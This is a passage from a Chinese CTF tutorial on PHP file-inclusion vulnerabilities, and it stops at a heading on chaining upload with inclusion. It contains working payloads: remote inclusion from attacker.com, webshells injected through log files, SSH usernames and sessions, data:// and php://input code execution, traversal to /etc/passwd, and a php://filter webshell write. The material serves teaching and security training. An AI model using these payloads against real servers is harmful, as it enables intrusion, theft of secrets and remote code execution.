# 1. 文件包含

文件包含漏洞让服务器把任意文件当成代码执行。配合PHP伪协议，即使只能读文件也能变成代码执行。

**场景：** 一个网站通过 `?page=about.php` 来加载页面内容，用户控制 `page` 参数。
**原理：** PHP 的 `include()`/`require()` 函数会把指定文件内容当作 PHP 代码执行。如果文件名来自用户输入且没有过滤，攻击者可以包含任意文件。
**实战：** 尝试 `?page=../../../../etc/passwd` 读取系统文件，或者 `?page=php://filter/convert.base64-encode/resource=index.php` 读取源码。
**避坑：** 包含 `.php` 文件时代码会被执行而看不到源码，必须配合 `php://filter` 等伪协议读取。

---

## 1.1 文件包含常见函数

文件包含漏洞的核心在于 PHP 中一些函数在引入文件时，文件名由用户控制且未经严格校验。以下是 PHP 中最常见的文件包含相关函数：

**核心包含函数：**

| 函数 | 说明 | 出错时行为 | 是否可包含远程文件 |
|------|------|------------|:---:|
| `include()` | 包含并运行指定文件 | 警告（Warning），脚本继续执行 | 需开启 `allow_url_include` |
| `include_once()` | 同上，但只包含一次，避免重复定义 | 同上 | 同上 |
| `require()` | 包含并运行指定文件 | 致命错误（Fatal Error），脚本停止 | 同上 |
| `require_once()` | 同上，但只包含一次 | 同上 | 同上 |

**简单理解：**

`include()` 和 `require()` 的作用就是把另一个文件的内容"粘贴"到当前位置来执行。比如：

```php
// index.php
$file = $_GET['page'];
include($file);
```

如果访问 `index.php?page=test.php`，PHP 就会去读取 `test.php` 并执行其中的代码。如果 `$file` 的值来自用户输入且没有过滤，攻击者就能控制包含哪个文件，这就是文件包含漏洞。

**其他可能触发文件包含/读取的函数：**

| 函数 | 说明 | 能否包含 PHP 代码 |
| ---- | ---- | :---: |
| `include()` / `require()` | 包含并执行 PHP | 是 |
| `fopen()` | 打开文件 | 否（只读） |
| `file_get_contents()` | 读取文件内容到字符串 | 否 |
| `highlight_file()` / `show_source()` | 高亮显示文件源码 | 否 |
| `readfile()` | 读取文件并写入输出缓冲 | 否 |
| `file()` | 把整个文件读入数组 | 否 |
| `parse_ini_file()` | 解析 INI 配置文件 | 否 |
| `file_put_contents()` | 写入文件 | 否 |
| `move_uploaded_file()` | 移动上传文件 | 否 |

>**与 RCE 中危险函数的区别**：RCE 中提到的 `system()`、`eval()` 等是直接执行命令或代码。文件包含函数本身不执行命令，但可以通过包含恶意文件间接达到代码执行的效果。

 **新手避坑：** 很多人以为只有 `include()` 和 `require()` 才算文件包含漏洞。实际上，`file_get_contents()`、`highlight_file()` 虽然不能执行代码，但可以**读取任意文件**，在 CTF 中同样可以泄露源码和敏感信息。

## 1.2 本地文件包含（LFI）

本地文件包含（Local File Inclusion，LFI）是指包含的文件位于服务器本地。这是 CTF 中最常见的文件包含类型。

**漏洞代码示例：**

```php
<?php
$file = $_GET['file'];      // 用户可控
include($file);    // 直接包含用户输入
?>
```

**场景：** CTF 题目中有类似 `index.php?file=upload.txt` 的功能，点击不同文件加载不同内容。
**原理：** 没有对 `file` 参数做任何过滤，可以使用路径遍历 `../` 读取服务器任意文件。
**实战：** 尝试 `?file=../../../../etc/passwd` 看是否能读取系统用户信息。
**避坑：** Linux 下需要多次 `../` 才能跳到根目录，可以根据报错信息判断目录深度。

**常见利用方式：**

**1. 读取系统敏感文件**

通过目录穿越（`../`）读取系统文件：

```
?file=../../../../etc/passwd
?file=../../../../proc/self/environ
```

**Linux 下常见敏感文件：**

| 路径 | 说明 | CTF 中出现频率 |
|------|------|:---:|
| `/etc/passwd` | 系统用户信息 | 高 |
| `/etc/hosts` | 主机名与 IP 映射 | 中 |
| `/proc/self/environ` | 当前进程环境变量（可能含 flag） | 中 |
| `/proc/self/fd/0` | 标准输入文件描述符 | 低 |
| `/proc/self/fd/1` | 标准输出文件描述符 | 低 |
| `/proc/self/fd/2` | 标准错误文件描述符 | 低 |
| `/proc/self/cmdline` | 进程启动命令和参数 | 低 |
| `/proc/1/environ` | PID 1 进程环境变量 | 低 |
| `/var/log/apache2/access.log` | Apache 访问日志 | 高（用于 Getshell） |
| `/var/log/nginx/access.log` | Nginx 访问日志 | 高（用于 Getshell） |
| `/var/log/auth.log` | 认证日志（SSH 日志） | 中 |
| `/var/log/vsftpd.log` | FTP 日志 | 低 |
| `/etc/nginx/nginx.conf` | Nginx 配置文件 | 中 |
| `/etc/apache2/apache2.conf` | Apache 配置文件 | 中 |
| `/etc/php.ini` | PHP 配置文件 | 中 |
| `.git/config` | Git 配置（可能泄露远程仓库 URL） | 中 |
| `flag` / `flag.txt` / `/flag` | 可能的 flag 位置 | 高 |

**Windows 下常见敏感文件：**

| 路径 | 说明 |
|------|------|
| `C:\Windows\System32\drivers\etc\hosts` | 主机文件 |
| `C:\boot.ini` | 系统启动配置 |
| `C:\Windows\win.ini` | Windows 配置 |
| `C:\Windows\System32\inetsrv\config\applicationHost.config` | IIS 配置 |
| `C:\Windows\debug\NetSetup.log` | 网络安装日志 |
| `C:\Windows\System32\config\SAM` | 用户密码哈希（但已加密） |

**2. 包含 Web 应用自身文件**

读取网站源码：
```
?file=index.php          → 不会正常显示，因为 PHP 代码被执行了
?file=../config.php      → 可能读取到数据库密码等敏感配置
```

直接包含 `.php` 文件会因为代码被执行而看不到源码。此时需要用到伪协议（见 1.4 节）。

**3. 包含日志文件（Getshell 常用手段）**

当无法上传文件时，可以尝试包含服务器的日志文件。先通过 HTTP 请求向日志中写入 PHP 代码，再包含该日志文件执行（详见 1.5 节）。

**4. 包含上传的文件**

如果有文件上传点，可以将一句话木马藏在图片或其他文件中，再通过文件包含漏洞来执行（详见 1.8 节）。

**LFI 路径遍历总结表：**

| 目标文件 | 路径 | 说明 |
| -------- | ---- | ---- |
| 系统密码文件 | `../../../etc/passwd` | 最基础的测试 |
| 当前进程环境 | `../../../proc/self/environ` | 可能含敏感变量 |
| Web 日志 | `../../../var/log/apache2/access.log` | 日志包含 Getshell |
| SSH 日志 | `../../../var/log/auth.log` | SSH 用户名注入代码 |
| PHP 配置 | `../../../etc/php.ini` | 查看配置项 |
| 网站源码 | `php://filter/convert.base64-encode/resource=index.php` | 伪协议读取 |

 **新手避坑：** 路径穿越的 `../` 数量不要写死。先试试 `../` 看是否能跳出目录，然后逐步增加层数。如果目录深度不确定，可以用 BurpSuite Intruder 或脚本生成 `../../../../` 等多种组合。

## 1.3 远程文件包含（RFI）

远程文件包含（Remote File Inclusion，RFI）是指包含远程服务器上的文件。与 LFI 不同，RFI 要求服务器开启相关配置。

**利用条件：**

`php.ini` 中需要开启：
- `allow_url_include = On`（PHP 5.2+ 默认关闭）
- `allow_url_fopen = On`（通常默认开启）

**攻击原理：**

攻击者在自己控制的 VPS 上放置恶意 PHP 文件，然后让目标服务器去包含它：

```
# 攻击者 VPS 上的 shell.txt
<?php system($_GET['cmd']); ?>

# 目标 URL
http://target.com/index.php?file=http://attacker.com/shell.txt&cmd=whoami
```

目标服务器会从攻击者 VPS 下载 `shell.txt` 并在本地执行，`system('whoami')` 也就运行在目标服务器上了。

>**为什么 `.txt` 文件也能触发？为什么是 PHP 解释器在执行？**
>
> 这是初学者最容易困惑的地方。要理解这个问题，先要搞清楚 `include()` 到底是什么。
>
>**`include()` 不是简单的"读取文件内容"。**它的工作方式是：把目标文件的内容**当作 PHP 代码插入到当前脚本中**，然后交给正在运行的 PHP 解释器去解析执行。
>
> 打个比方：`index.php` 本身就正在被 PHP 解释器执行。当解释器执行到 `include('shell.txt')` 这一行时，它会暂停当前脚本，去取 `shell.txt` 的内容，把内容**当作 PHP 代码的一部分**继续解释执行，执行完再回到原来的位置继续。
>
> 同样的道理，如果你上传一个改后缀为 `.jpg` 的 PHP 木马（"图片马"），通过 `include()` 来加载它，一样会触发代码执行。

**LFI 与 RFI 对比：**

| 对比项 | LFI（本地文件包含） | RFI（远程文件包含） |
|--------|---------------------|---------------------|
| 文件位置 | 服务器本地 | 远程服务器 |
| 利用条件 | 只需漏洞存在 | 需 `allow_url_include=On` |
| 利用难度 | 较低 | 需额外配置 |
| 危害程度 | 信息泄露 → 可配合升级为 RCE | 直接代码执行 |
| CTF 出现频率 | 高 | 中（现代 PHP 默认关闭） |
| 是否需要 VPS | 否 | 是（或公共托管服务） |
| 防火墙影响 | 不受出站规则影响 | 可能被出站防火墙阻止 |

 **新手避坑：** 现在大部分 CTF 题目的 PHP 版本都 >= 5.2，`allow_url_include` 默认关闭，所以 RFI 在现代 CTF 中比较少见。但有些题目故意开启了这个配置。如果 LFI 试不通，别忘了尝试一下 RFI。

## 1.4 PHP 伪协议利用

PHP 伪协议是文件包含漏洞中最重要的利用技巧之一。即使 `allow_url_include` 关闭，很多伪协议仍然可以使用。

### 1.4.1 PHP 伪协议完整使用表

| 伪协议 | 功能 | 需 `allow_url_include` | 需 `allow_url_fopen` | 可用作 include | 可用作读文件 |
| ------ | ---- | :---: | :---: | :---: | :---: |
| `php://filter` | 读取文件源码，编码转换 | 否 | 否 | 是 | 是 |
| `php://input` | POST 请求体作为代码执行 |**是**| 否 | 是 | 否 |
| `file://` | 读取本地文件 | 否 | 否 | 是 | 是 |
| `data://` | 直接写入代码执行 | 是 | 是 | 是 | 否 |
| `zip://` | 读取 ZIP 压缩包内文件 | 否 | 否 | 是 | 是 |
| `phar://` | 读取 phar 包内文件，可触发反序列化 | 否 | 否 | 是 | 是 |
| `compress.zlib://` | 读取 gz 压缩文件 | 否 | 否 | 是 | 是 |
| `compress.bzip2://` | 读取 bz2 压缩文件 | 否 | 否 | 是 | 是 |
| `expect://` | 直接执行命令（需 expect 扩展） | 否 | 否 | 是 | 否 |
| `glob://` | 查找匹配路径模式 | 否 | 否 | 否 | 是 |
| `http://` | 远程 HTTP 文件包含 | 是 | 是 | 是 | 是 |
| `ftp://` | 远程 FTP 文件包含 | 是 | 是 | 是 | 是 |

 **新手避坑：** `php://filter` 是最常用的协议，因为它**不需要任何额外配置**就可以读取文件源码。其他协议如 `zip://` 和 `phar://` 需要先上传一个文件才能利用。

### 1.4.2 php://filter（读取文件源码）

`php://filter` 是一种元封装器（meta-wrapper），用于对数据流进行过滤处理。当直接包含 `.php` 文件时源码会被执行而看不到，使用 `php://filter` 配合 base64 编码就能读取源码。

**常用方式：**

```
?file=php://filter/read=convert.base64-encode/resource=index.php
```

执行流程：
1. `resource=index.php` — 指定要读取的文件
2. `convert.base64-encode` — 对文件内容进行 base64 编码
3. 浏览器输出 base64 编码后的源码，解码即可看到原始 PHP 代码

**为什么需要 base64 编码？**

如果不编码，`index.php` 中的 `<?php ... ?>` 代码会被 PHP 解释器执行，你看到的只是执行结果（通常是空白页）。编码后的内容不会被当作 PHP 代码执行，而是原样输出。

**常用过滤器：**

| 过滤器 | 说明 | 用途 |
|--------|------|------|
| `convert.base64-encode` | Base64 编码 | 最常用，读取 PHP 源码 |
| `convert.base64-decode` | Base64 解码 | 用于写入文件的 Trick |
| `string.rot13` | ROT13 编码 | 绕过关键词过滤 |
| `convert.iconv.*` | 字符编码转换 | 编码转换绕过 |
| `string.toupper` | 转大写 | 少见 |
| `string.tolower` | 转小写 | 少见 |
| `zlib.deflate` | 压缩 | 合并数据 |
| `zlib.inflate` | 解压缩 | 解压数据 |

**链式调用：**

多个过滤器可以用 `|` 连接，按顺序从左到右执行：

```
?file=php://filter/read=string.rot13|convert.base64-encode/resource=index.php
```

执行顺序：先对文件内容做 ROT13 编码，再对结果做 base64 编码，最后输出。

**高级用法：多级过滤器链绕过关键字过滤：**

```
# 如果题目过滤了 base64 关键字，可以尝试：
?file=php://filter/read=convert.iconv.utf-8.utf-16|convert.base64-encode/resource=index.php
# iconv 转换后再 base64，绕过对直接 base64 的检测
```

**读取多个文件技巧：**

```php
// 通过 php://filter 配合多级路径
?file=php://filter/read=convert.base64-encode/resource=../config.php
?file=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

### 1.4.3 data://（直接执行代码）

`data://` 伪协议允许直接传递数据，配合 `include()` 可以直接执行 PHP 代码。

**基本用法：**

```
# 纯文本方式
?file=data://text/plain,<?php phpinfo();?>

# base64 编码方式（绕过过滤）
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

> `PD9waHAgcGhwaW5mbygpOz8+` 是 `<?php phpinfo();?>` 的 base64 编码。

**适用场景：**

- 需要直接执行 PHP 代码时
- 没有自己的 VPS 来托管远程文件时——相比 RFI（`http://`）的优势是代码可以直接写在 URL 里，不需要额外搭建服务器
- 不依赖文件上传或日志文件，可以直接在 URL 中写入 payload

**使用条件：**

- `allow_url_include = On`
- `allow_url_fopen = On`

---

### 1.4.4 file://（直接读本地文件）

`file://` 协议是最简单的读本地文件协议，**不受 `allow_url_fopen` 和 `allow_url_include` 影响**。

**基本用法：**

```
?file=file:///etc/passwd
?file=file:///var/www/html/config.php
```

使用绝对路径，前面有三个斜杠（`file://` 后跟完整路径 `/etc/passwd`，合起来就是 `file:///etc/passwd`）。

---

### 1.4.5 php://input（POST 传代码）

`php://input` 可以访问 HTTP 请求的原始数据（raw request body），不受 `allow_url_fopen` 限制；但把它交给 `include()` / `require()` 当 PHP 代码执行时，**受 `allow_url_include` 限制**。它本身只提供原始字节流，不会自动执行请求体。

**基本用法：**

URL：`?file=php://input`

POST body：
```php
<?php system('ls'); ?>
```

**适用场景：**

- 需要传递较长的 PHP 代码
- `data://` 被禁用时
- 需要执行多行代码或复杂逻辑

**注意事项：**

-**默认配置下处理 `multipart/form-data` 时，`php://input` 通常不可用。**

  原因和 PHP 底层处理 POST body 的机制有关：

  -**普通表单 / JSON（`application/x-www-form-urlencoded` / `application/json`）**：通常可以读取原始请求体；PHP 5.6 起 `php://input` 可以重复读取，老版本行为不同。
  -**文件上传（`multipart/form-data`）**：当 `enable_post_data_reading` 保持默认开启时，PHP 会先解析 multipart 数据并填充 `$_POST` / `$_FILES`，此时 `php://input` 不可用；关闭该配置时行为不同，但应用也要自行解析请求体。

  所以用 `php://input` 传代码时，通常应避免 `multipart/form-data`，并同时确认 PHP 版本、`enable_post_data_reading` 与 `allow_url_include`。

- 请求方法通常是 POST
- 页面没有回显时，可与外带数据技巧结合
-**PHP 协议名不区分大小写。**如果题目过滤了 `php` 关键词（如 `strpos($file, 'php') !== false`），直接写 `Php://input` 或 `PHP://input` 即可绕过。这个特性对所有 PHP 伪协议都适用——`pHp://filter`、`FILE://`、`DatA://` 均有效。

### 1.4.6 其他伪协议详解

| 协议 | 说明 | 示例 |
|------|------|------|
| `expect://` | 直接执行命令（需安装 expect 扩展） | `expect://whoami` |
| `zip://` | 包含 ZIP 压缩包内的文件 | `zip:///var/www/html/uploads/shell.zip%23shell.txt` |
| `phar://` | 包含 phar 包内文件；PHP 7 及之前还可能隐式触发 metadata 反序列化 | `phar://uploads/shell.jpg/shell.php` |
| `compress.zlib://` | 包含 gz 压缩文件 | `compress.zlib:///var/www/html/uploads/shell.jpg` |
| `compress.bzip2://` | 包含 bz2 压缩文件 | `compress.bzip2:///var/www/html/uploads/shell.jpg` |

>**关于 `zip://` 和 `phar://`：**
>
> 这两个协议在 CTF 中很实用。如果能上传一个 `.zip` 或 `.phar` 文件，即使后缀被改成 `.jpg`，通过这两个协议仍然能包含其中打包的 PHP 代码。
>
>**`zip://` 中 `%23` 是什么？**`#` 在 URL 里是锚点标识符，直接写会被浏览器截断。`%23` 是 `#` 的 URL 编码，PHP 解析时会把它还原为 `#`，而 `zip://` 用 `#` 分隔压缩包路径和包内文件名。所以：
> ```
> zip://uploads/shell.zip#shell.txt  → 在代码或本地路径中直接写
> ?file=zip://uploads/shell.zip%23shell.txt  → 在 URL 里必须编码为 %23
> ```
>
>**`phar://` 读取归档时通常不依赖上传后的扩展名。**即使 phar 被改名为 `shell.jpg`，仍可能通过 `phar://uploads/shell.jpg/shell.php` 读取包内文件。元数据反序列化必须区分版本：PHP 7 及之前打开归档会自动反序列化 metadata；PHP 8 起普通文件操作不再自动反序列化，只有显式调用 `Phar::getMetadata()` 等接口才会触发。这一点在"PHP 反序列化"章节会深入讨论。

**`phar://` 反序列化触发原理：**

```
// phar:// 在读取 phar 文件时，会自动反序列化 phar 的 metadata
// 构造一个恶意的 phar 文件：
class TestObject {
    public function __destruct() {
        echo $this->data;
    }
}

// 创建 phar 文件时，将序列化后的 TestObject 设置到 metadata
// 当使用 phar:// 协议读取时，metadata 会自动反序列化
// 触发 __destruct() / __wakeup() 等魔术方法
```

 **新手避坑：** `phar://` 不仅是一个文件包含协议，还是 PHP 反序列化的触发入口。即使没有文件包含漏洞，只要存在 `file_exists()`、`is_dir()` 等文件操作函数且参数可控，也可以通过 `phar://` 触发反序列化。

### 1.4.7 伪协议可用性总结

| 协议 | 依赖 `allow_url_include` | 依赖 `allow_url_fopen` | CTF 出现频率 |
|------|:---:|:---:|:---:|
| `php://filter` | 否 | 否 | 极高 |
| `php://input` |**作为 include 目标时是**| 否 | 高 |
| `file://` | 否 | 否 | 高 |
| `data://` | 是 | 是 | 中 |
| `zip://` | 否 | 否 | 中 |
| `phar://` | 否 | 否 | 中 |
| `expect://` | 否 | 否 | 低（需扩展） |
| `http://` | 是 | 是 | 低 |
| `compress.zlib://` | 否 | 否 | 低 |
| `compress.bzip2://` | 否 | 否 | 低 |

## 1.5 包含日志文件 Getshell

当服务器存在文件包含漏洞但没有文件上传点时，可以利用服务器日志文件来 Getshell。

**核心思路：**

1. 通过 HTTP 请求（如 User-Agent）向服务器日志中"写入" PHP 一句话木马
2. 通过文件包含漏洞包含该日志文件
3. 日志中的 PHP 代码被执行，Getshell

### 1.5.1 完整日志包含流程

```text
Step 1: 探测日志路径
        尝试包含常见日志路径，确认日志文件可读
        → /var/log/apache2/access.log

Step 2: 向日志注入代码
        发送 HTTP 请求，在 User-Agent 中写入 PHP 代码
        → User-Agent: <?php system($_GET['cmd']); ?>

Step 3: 验证注入
        再次访问日志文件路径，确认代码已写入
        → 查看日志中出现了 <?php system($_GET['cmd']); ?>

Step 4: 执行命令
        包含日志文件并传递 cmd 参数
        → ?file=/var/log/apache2/access.log&cmd=whoami

Step 5: 获取 Shell（可选）
        写入更复杂的 Webshell
        → <?php file_put_contents('shell.php','<?php system($_GET["c"]);?>'); ?>
```

### 1.5.2 Apache 日志包含

Apache 默认日志路径：
- `/var/log/apache2/access.log`（Debian/Ubuntu）
- `/var/log/httpd/access_log`（CentOS/RHEL）
- `/opt/lampp/logs/access_log`（XAMPP）

**攻击步骤：**

Step 1 — 向日志中写入 PHP 代码。修改请求的 User-Agent 为木马：

```
GET / HTTP/1.1
Host: target.com
User-Agent: <?php system($_GET['cmd']); ?>
```

这条请求会被记录在 access.log 中，User-Agent 的内容（即 PHP 代码）原样写入日志。

Step 2 — 包含日志文件执行代码：

```
?file=/var/log/apache2/access.log&cmd=whoami
```

服务器包含 `access.log` → 日志中的 `<?php system($_GET['cmd']); ?>` 被 PHP 解析执行 → `system('whoami')` 执行 → 输出命令结果。

### 1.5.3 Nginx 日志包含

Nginx 默认日志路径：
- `/var/log/nginx/access.log`
- `/var/log/nginx/error.log`

攻击方式与 Apache 相同。

### 1.5.4 SSH 日志包含

SSH 日志路径：`/var/log/auth.log`（或 `/var/log/secure`）

也可以尝试通过 SSH 连接的用户名向 auth.log 写入 PHP 代码：

```bash
ssh '<?php system("id");?>'@目标IP
```

连接失败后，用户名（即 PHP 代码）会被记录到 auth.log 中，再通过文件包含来执行。

>**注意：这是一个 CTF 专用技巧，真实环境中几乎不可行。**原因有二：第一，`auth.log` 默认权限为 `640`（属主 `root`），Web 服务器用户（如 `www-data`）没有读权限；第二，SSH 用户名不允许 `<`、`?` 等特殊字符，这些字符在写入日志前就会被 SSH 服务拒绝。CTF 题目中通常故意放宽了这些限制。

 **新手避坑：** SSH 日志包含在真实环境中基本行不通，但在 CTF 中经常出现。如果日志包含试了 `access.log` 不成功，可以试试 `auth.log`。同时注意：SSH 日志中的特殊字符可能被转义或过滤，payload 可能需要调整。

### 1.5.5 其他可写入的日志文件

| 日志文件 | 路径 | 注入方式 |
| -------- | ---- | -------- |
| Apache 访问日志 | `/var/log/apache2/access.log` | User-Agent / URL / Referer |
| Apache 错误日志 | `/var/log/apache2/error.log` | 触发 404 错误 |
| Nginx 访问日志 | `/var/log/nginx/access.log` | User-Agent / URL |
| Nginx 错误日志 | `/var/log/nginx/error.log` | 触发错误请求 |
| SSH 日志 | `/var/log/auth.log` | SSH 用户名 |
| FTP 日志 | `/var/log/vsftpd.log` | FTP 用户名/密码 |
| Mail 日志 | `/var/log/mail.log` | SMTP 通信内容 |
| Cron 日志 | `/var/log/cron` | cron 任务输出 |
| PHP 错误日志 | `/var/log/php_errors.log` | PHP 错误信息 |
| Tomcat 日志 | `/var/log/tomcat/catalina.out` | HTTP 请求内容 |

### 1.5.6 日志路径探测技巧

当不确定日志路径时：
1. 根据错误回显判断服务器类型（Apache/Nginx/IIS）
2. 尝试常见默认路径
3. 如果已有 LFI，直接包含服务器配置文件查看日志路径：
  - Apache：`/etc/apache2/apache2.conf` 或 `/etc/httpd/conf/httpd.conf`，搜索 `CustomLog`、`ErrorLog` 字段
  - Nginx：`/etc/nginx/nginx.conf`，搜索 `access_log`、`error_log` 字段
4. 结合 phpinfo 页面查看 `APACHE_LOG_DIR` 等环境信息
5. 查看 `/proc/self/fd/0`、`/proc/self/fd/1`、`/proc/self/fd/2` 等进程文件描述符

 **新手避坑：** 日志包含时，User-Agent 中的特殊字符可能被 apache 或 nginx 转义。如果 `<?php ... ?>` 被转义了，试试用 `<?=...?>` 短标签。另外，日志文件通常很大，包含后页面可能会很卡，可以先通过 LFI 确认日志路径正确再注入代码。

### 1.5.7 Session 文件包含

PHP Session 文件也是一个常见的包含目标。Session 文件默认存储在 `/tmp/` 目录下。

**Session 文件命名规则：**

```
/tmp/sess_[PHPSESSID的值]
```

例如 `PHPSESSID=abc123` 对应的 Session 文件路径是：
```
/tmp/sess_abc123
```

**攻击步骤：**

Step 1 — 获取或设置 PHPSESSID：

```http
GET / HTTP/1.1
Host: target.com
Cookie: PHPSESSID=my_session_id
```

Step 2 — 在 Session 中写入 PHP 代码。如果网站将用户输入（如用户名、留言内容）存入 Session 中：

```http
POST /profile.php HTTP/1.1
Host: target.com
Cookie: PHPSESSID=my_session_id
Content-Type: application/x-www-form-urlencoded

username=<?php system($_GET['cmd']); ?>
```

Step 3 — 包含 Session 文件：

```
?file=/tmp/sess_my_session_id&cmd=whoami
```

**常见 Session 存储路径：**

| 存储位置 | 路径 |
| -------- | ---- |
| 默认（Linux） | `/tmp/sess_{PHPSESSID}` |
| 自定义路径（php.ini） | `session.save_path` 配置的值 |
| Ubuntu/Debian | `/var/lib/php/sessions/sess_{PHPSESSID}` |
| CentOS/RHEL | `/var/lib/php/session/sess_{PHPSESSID}` |
| XAMPP（Windows） | `C:\xampp\tmp\sess_{PHPSESSID}` |

**注意：** 如果 `session.auto_start` 为 Off，则只有调用了 `session_start()` 的页面才会创建 Session 文件。需要先访问一个调用了 `session_start()` 的页面。

 **新手避坑：** Session 文件包含的关键在于**找到 Session 中存储的内容**。如果系统不将用户输入存入 Session，那 Session 文件里就没有可供利用的代码。需要先确认用户输入（如用户名、留言、头像URL等）被写入了 Session。

## 1.6 文件包含截断绕过

某些题目会在包含参数后拼接固定后缀（如 `.php`、`.html`），需要通过截断来绕过。

**典型代码：**

```php
<?php
$file = $_GET['file'];
include($file . '.php');   // 强制拼接 .php 后缀
?>
```

你传 `?file=index`，实际包含的是 `index.php`，无法直接包含 `/etc/passwd`。

### 1.6.1 %00 截断（PHP < 5.3.4）

在 PHP 5.3.4 之前，可以通过 `%00`（空字节）截断字符串：

```
?file=../../../etc/passwd%00
```

PHP 在底层调用 C 的 `fopen()` 时，`%00` 被解释为字符串结束符 `\0`，后面的 `.php` 被截断，实际包含的是 `/etc/passwd`。

> `magic_quotes_gpc = On` 时 `%00` 会被转义，此方法失效。PHP 5.3.4+ 已修复。

### 1.6.2 路径长度截断（PHP < 5.2.8）

在 PHP 5.2.8 之前，操作系统对路径长度有限制。传入超过限制长度的路径时，末尾的字符（包括拼接的 `.php`）会被丢弃：

```
?file=../../../etc/passwd/./././././. ...（持续叠加直到超过 4096 字节）
```

>**PHP（7.x、8.x）下以上截断方法均已失效。但仍有绕过思路：**

### 1.6.3 现代 PHP 下的绕过策略

**利用 `data://` 执行代码**

当你不需要读文件、而是想执行 PHP 代码时，`data://` 天然免疫后缀拼接：

```
?file=data://text/plain,<?php system('ls');?>
```

拼上 `.php` 之后变成：

```
data://text/plain,<?php system('ls');?>.php
```

`?>` 已经闭合了 PHP 代码块，末尾的 `.php` 只是普通文本，PHP 解释器直接忽略（原样输出）。代码照常执行。

**前提是 `allow_url_include = On`。**

**利用 `php://input` 执行代码：**

```
URL: ?file=php://input
POST Body: <?php system('ls');?>
```

拼接后为 `php://input.php`，但 `php://` 协议不受 `.php` 后缀影响。

**利用 `php://filter` 读取文件：**

```
?file=php://filter/read=convert.base64-encode/resource=../../../etc/passwd
```

拼接后为 `php://filter/read=convert.base64-encode/resource=../../../etc/passwd.php`，但 `resource=` 指定的路径中 `.php` 是实际文件名的一部分。

**利用路径遍历攻击后缀拼接：**

如果拼接的是 `.php`，但我们可以使用 `php://filter` 读取不含后缀的文件。或者使用其他协议绕过后缀限制。

### 1.6.4 截断绕过方法总结表

| 方法 | 适用 PHP 版本 | 条件 | 示例 |
| ---- | ------------ | ---- | ---- |
| `%00` 空字节截断 | < 5.3.4 | `magic_quotes_gpc = Off` | `?file=shell%00` |
| 路径长度截断 | < 5.2.8 | 路径超过 4096 字节 | `?file=.../././.(很多)` |
| `data://` 伪协议 | 任意版本 | `allow_url_include = On` | `?file=data://text/plain,<?php...?>` |
| `php://input` 协议 | 任意版本 | `allow_url_include = On` | POST body 写入代码 |
| `php://filter` 协议 | 任意版本 | 无特殊要求 | 读取文件源码 |
| `zip://` 协议 | 任意版本 | 需要上传 zip 文件 | `zip://uploads/shell.zip%23shell.txt` |

## 1.7 `php://filter` 在文件写入中的利用 —— 绕过 `<?php exit();?>`

前面讲的都是 `include()` 读文件的场景。实际上 `php://filter` 在**文件写入**场景中也能派上用场。一个典型的 CTF 题目模式是：

```php
file_put_contents($filename, "<?php exit();?>" . $content);
```

你可以控制 `$filename` 和 `$content`，但写入的内容前面被强制拼接了 `<?php exit();?>`。`exit()` 会让 PHP 脚本在到达你的代码之前就终止，所以直接写入一句话木马后去访问，页面什么也不会输出。

### 1.7.1 核心思路：`convert.base64-decode` 吞掉前置字符

**关键特性：** PHP 的 `convert.base64-decode` 过滤器在解码时，遇到不是合法 base64 的字符（A-Z、a-z、0-9、`+`、`/`、`=` 以外的所有字符），会**静默跳过**，不报错也不中止。

于是你让 `filename` 指向一个带了 `base64-decode` 过滤器的流，`file_put_contents()` 写入数据时，数据先经过 `base64-decode` 解码再写入文件：

```
POST:
  filename=php://filter/write=convert.base64-decode/resource=shell.php
  content=aPD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

**逐步拆解：**

**Step 1 —**`file_put_contents()` 接收到的原始内容：

```
<?php exit();?>aPD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

前面是 `<?php exit();?>`（题目拼接的），后面是你的 base64 payload。

**Step 2 —**数据流经 `convert.base64-decode` 过滤器。`<?php exit();?>` 中只有 `p h p e x i t` 这 7 个字母是合法 base64 字符，其余 `< ? 空格 ( ) ; >` 全部被静默丢弃。过滤后实际参与解码的字符串是：

```
phpexitaPD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

前面 `phpexita` 是残留下来的"碎片"（8 个字符正好是你加的那个占位 `a` + 前一步的 7 个），解码后得到 6 字节不可读乱码。后面是你完整的 base64 payload，正常解码为 `<?php system('cat /flag');?>`。

**Step 3 —**最终写入 `shell.php` 的内容：

```
[6字节乱码]<?php system('cat /flag');?>
```

乱码部分不在 `<?php ... ?>` 标签内，PHP 会把它当作普通响应字节输出；随后解析到你的 `<?php system('cat /flag');?>` 时仍会执行代码。是否产生额外警告取决于后续文件内容和运行配置，并不是这个前缀的固定行为。

### 1.7.2 Payload 构造要点——为什么要用 `a` 占位对齐

你的 base64 payload 前面多了一个 `a`，这不是随便加的。

**Base64 解码以 4 个字符为一组进行。**4 个 base64 字符 → 3 个原始字节。如果你传给解码器的字符串总长度不是 4 的倍数，最后一组会被丢弃或用 `=` 补齐，导致数据错乱。

回到本例：

```
<?php exit();?> 中幸存的合法字符: p h p e x i t → 共 7 个
```

7 不是 4 的倍数。如果你直接在后面拼 base64 payload：

```
p h p e x i t  P D 9  w  a  H  A  ... （payload 开头）
└───┬───┘└───┬───┘└───┬───┘└───┬───┘
  组1       组2       组3       组4  ← 组3 只有 3 个有效字符（tPD），被当成不完整组
```

你的 payload 开头 `PD9w` 被拆散到两个不同的组里，解码结果完全错乱。

**加一个 `a` 凑成 8 个**（2 个完整组 × 4），你的 payload 就能从第 3 组开头干净地开始：

```
p h p e x i t a  P D 9  w  a  H  A  ... （payload 开头）
└───┬───┘└───┬───┘└───┬───┘└───┬───┘
  组1       组2       组3       组4  ← 每组都是完整的 4 个字符
```

`phpe` 解码为 3 字节乱码，`xita` 解码为 3 字节乱码，然后 `PD9w` 开始整整齐齐地解码为你的 PHP 代码。

 **新手避坑：** 这个技巧的核心是**`php://filter` 可以同时用于读取和写入**。写入时利用 `convert.base64-decode` 过滤器吞掉非 base64 字符的特性，让 `<?php exit();?>` 中的大部分字符被过滤掉。注意：`a` 占位字符不能多也不能少，7 个幸存字符 + 1 个 `a` = 8（4 的倍数）。

## 1.8 文件上传 + 文件包含组合利用

### 1.8.1 组合攻击思路

文件上传和文件包含经常配合使用。单独的文件上传通常无法直接执行代码（图片、文本等非 PHP 文件不执行），但通过文件包含来加载上传的文件，就可以执行其中的 PHP 代码。

```text
攻击链：
